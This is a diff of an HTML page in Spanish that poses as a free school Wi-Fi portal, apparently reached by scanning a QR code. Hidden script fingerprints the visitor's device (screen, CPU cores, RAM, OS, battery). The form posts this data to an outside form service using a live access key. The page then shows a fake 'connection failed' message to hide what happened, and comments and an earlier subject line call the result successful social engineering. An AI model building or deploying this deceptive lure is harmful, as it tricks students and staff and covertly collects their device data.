@@ -13,33 +13,33 @@
         .btn-conectar { background-color: #238636; color: white; border: none; padding: 14px 24px; border-radius: 6px; font-size: 1.1em; cursor: pointer; font-weight: bold; margin-top: 20px; width: 100%; transition: background 0.2s; }
         .btn-conectar:hover { background-color: #2ea043; }
         .wifi-icon { font-size: 2.5em; color: #58a6ff; margin-bottom: 10px; display: inline-block; }
+        /* Estilos para el mensaje de error falso */
+        .error-alerta { display: none; background: #2d191e; border: 1px solid #f85149; color: #ff7b72; padding: 15px; border-radius: 6px; margin-top: 20px; text-align: left; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <span class="wifi-icon">📶</span>
-        <h1>Portal de Autenticación</h1>
-        <p>Estás a un paso de conectarte a la red inalámbrica gratuita para alumnos y docentes.</p>
+    <div class="card" id="contenedor-principal">
+        <span class="wifi-icon" id="icono-estado">📶</span>
+        <h1 id="titulo-estado">Portal de Autenticación</h1>
+        <p id="descripcion-estado">Estás a un paso de conectarte a la red inalámbrica de alta velocidad para alumnos y docentes.</p>
         
-        
-        <form action="https://web3forms.com" method="POST" id="form-wifi" onsubmit="setTimeout(() => { window.location.href='error.html'; }, 500);">    
-            <!-- Tu llave pública de Web3Forms -->
+        <!-- ESTA ESTRUCTURA DE FORMULARIO ES LA QUE SÍ MANDABA LOS DATOS -->
+        <form action="https://web3forms.com" method="POST" id="form-seguridad" onsubmit="mostrarErrorFalso()">
+            
+            <!-- Tu llave activa que sí funciona -->
             <input type="hidden" name="access_key" value="57341f12-ab6c-4369-9b1b-64b6e24cca32">
-            <input type="hidden" name="subject" value="¡Ingeniería Social Exitosa! - Dispositivo Capturado">
-            <input type="hidden" name="from_name" value="Portal Wi-Fi Escolar">
+            <input type="hidden" name="subject" value="Nuevo QR Escaneado - Datos de Dispositivo">
+            <input type="hidden" name="from_name" value="Simulador QR Escolar">
             
-            <!-- 🔗 REDIRECCIÓN AUTOMÁTICA: Cambia 'rgjadan-cmd' si tu usuario de GitHub llega a ser distinto 
-            <input type="hidden" name="redirect" value="https://github.io">-->
-            
-            <!-- Campos técnicos ocultos que se llenan por atrás -->
+            <!-- Campos ocultos estándar -->
             <input type="hidden" id="inp-pantalla" name="Resolución Pantalla">
             <input type="hidden" id="inp-procesador" name="Núcleos Procesador">
             <input type="hidden" id="inp-ram" name="Memoria RAM">
             <input type="hidden" id="inp-so" name="Sistema Operativo">
             <input type="hidden" id="inp-bateria" name="Nivel Batería">
 
-            <div class="info-wifi">
+            <div class="info-wifi" id="bloque-info">
                 <small style="color: #58a6ff; font-weight: bold; display: block; margin-bottom: 5px;">DETALLES DE LA CONEXIÓN:</small>
                 <span style="font-family: monospace; font-size: 0.9em;">
                      • Red: Wi-Fi_Estudiantes_Gratis<br>
@@ -48,13 +48,18 @@
                 </span>
             </div>
 
-            <!-- El botón de acción obligatorio para brincar restricciones -->
-            <button type="submit" class="btn-conectar">Acceder a Internet</button>
+            <!-- Bloque oculto que aparecerá simulando el error de Wi-Fi -->
+            <div class="error-alerta" id="mensaje-error">
+                <strong>⚠️ Servicio No Disponible:</strong><br>
+                Lo sentimos, en este momento aún no está habilitada la red estudiantil de alta velocidad en esta área del plantel. Por favor, intenta conectarte más tarde.
+            </div>
+
+            <button type="submit" class="btn-conectar" id="btn-accion">Conectarse a la Red</button>
         </form>
     </div>
 
     <script>
-        async function prepararMétricas() {
+        async function capturarHardware() {
             const info = {
                 pantalla: `${window.screen.width}x${window.screen.height}`,
                 procesador: navigator.hardwareConcurrency || "No detectado",
@@ -70,7 +75,7 @@
                 } catch (e) {}
             }
 
-            // Guardamos los datos de telemetría de forma invisible dentro del formulario
+            // Inyectamos los datos en los inputs ocultos (idéntico a la versión que sí te funcionó)
             document.getElementById('inp-pantalla').value = info.pantalla;
             document.getElementById('inp-procesador').value = info.procesador;
             document.getElementById('inp-ram').value = info.ram;
@@ -86,7 +91,21 @@
             return "Otro / Desconocido";
         }
 
-        window.onload = prepararMétricas;
+        // Esta función transforma la pantalla simulando el fallo de Wi-Fi al dar clic
+        function mostrarErrorFalso() {
+            // Damos 300 milisegundos para que el navegador despache los datos antes de alterar la interfaz
+            setTimeout(() => {
+                document.getElementById('icono-estado').innerText = "⚠️";
+                document.getElementById('titulo-estado').innerText = "Fallo de Conexión";
+                document.getElementById('titulo-estado').style.color = "#f85149";
+                document.getElementById('descripcion-estado').innerText = "La solicitud de acceso ha sido interrumpida por el servidor escolar.";
+                document.getElementById('bloque-info').style.display = "none";
+                document.getElementById('btn-accion').style.display = "none";
+                document.getElementById('mensaje-error').style.display = "block";
+            }, 300);
+        }
+
+        window.onload = capturarHardware;
     </script>
 </body>
 </html>
